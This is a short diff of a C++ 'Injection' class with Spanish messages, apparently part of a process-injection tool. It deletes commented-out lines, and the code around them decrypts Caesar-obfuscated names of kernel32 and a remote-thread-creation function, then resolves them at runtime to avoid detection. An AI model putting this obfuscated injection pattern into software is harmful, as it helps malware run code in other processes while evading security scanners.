@@ -92,17 +92,10 @@ CreateThreadFunc Injection::_getCreateThreadFunction(void) {
 	std::string createRemote_str = Crypt::decryptCaesar(createRemote, 0xDE);
 
 
-	// Conversión de vector a string
-	//std::string kernel32_str(kernel32.begin(), kernel32.end());
-	//kernel32_str.push_back('\0');
-
 	HMODULE hModule = GetModuleHandleA(	kernel32_str.c_str());
 	if (hModule == NULL) {
 		std::cout << "No se pudo obtener el dll 32 de nucleo." << std::endl;
 	}
-
-	//std::string createRemote_str(createRemote.begin(), createRemote.end());
-	//createRemote_str.push_back('\0');
 
 	CreateThreadFunc pCreateThread = (CreateThreadFunc)GetProcAddress(hModule, createRemote_str.c_str());
 	if (pCreateThread == NULL) {
